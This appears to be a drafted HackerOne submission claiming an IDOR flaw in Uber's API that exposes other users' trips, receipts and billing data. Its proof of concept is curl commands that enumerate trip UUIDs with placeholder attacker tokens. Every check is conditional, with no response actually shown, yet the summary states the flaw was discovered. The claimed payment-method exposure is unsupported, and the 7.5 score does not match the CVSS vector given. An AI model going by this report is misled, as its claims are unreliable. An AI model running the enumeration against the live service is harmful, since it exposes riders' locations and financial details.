# 🚨 SUBMISSION PACKAGE: Uber IDOR (Trip/Receipt Access)
# Platform: HackerOne
# Program: Uber
# Date: 2026-06-06

---

## TITLE:
```
IDOR in Uber API Allows Access to Other Users' Trips and Receipts via ID Enumeration
```

---

## SEVERITY: High

---

## SUMMARY:
```
An Insecure Direct Object Reference (IDOR) vulnerability was discovered in Uber's API endpoints, allowing an authenticated user to access trips, receipts, and billing information belonging to other users by manipulating sequential or predictable object identifiers (trip IDs, UUIDs).

Uber's REST API exposes direct references to internal objects without proper authorization verification at the endpoint level.
```

---

## POC:

### 1. Trip ID Enumeration:

```bash
# Get your own trip IDs
curl -X GET "https://api.uber.com/v1.2/trips" -H "Authorization: Bearer ATTACKER_ACCESS_TOKEN"

# Test IDOR - Try accessing with different UUIDs
curl -X GET "https://api.uber.com/v1.2/trips/550e8401-e29b-41d4-a716-446655440001" -H "Authorization: Bearer ATTACKER_ACCESS_TOKEN"

# If returns 200 with different user's trip data = IDOR CONFIRMED
```

### 2. Business Trip Receipt IDOR:

```bash
# Access own business receipt
curl -X GET "https://api.uber.com/v1/business/trips/550e8400-e29b-41d4-a716-446655440000/receipt" -H "Authorization: Bearer BUSINESS_TOKEN"

# Try Victim's trip UUID
curl -X GET "https://api.uber.com/v1/business/trips/VICTIM_UUID/receipt" -H "Authorization: Bearer BUSINESS_TOKEN"

# Returns Victim's receipt with billing details = IDOR CONFIRMED
```

---

## IMPACT:

| Impact Type | Description |
|-------------|-------------|
| **Horizontal Privilege Escalation** | Access any user's trips, receipts, personal data |
| **Privacy Violation** | Expose pickup/dropoff locations, timestamps, rider identities |
| **Financial Data Exposure** | Access billing information, invoices, payment methods |

**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (7.5 High)

---

## STEPS TO SUBMIT:

1. Go to: https://hackerone.com/uber/reports/new
2. Login with: potosopotosolo@gmail.com
3. Copy TITLE, SUMMARY, POC, IMPACT to the form
4. Click "Submit Report"

**Reporter:** potosopotosolo@gmail.com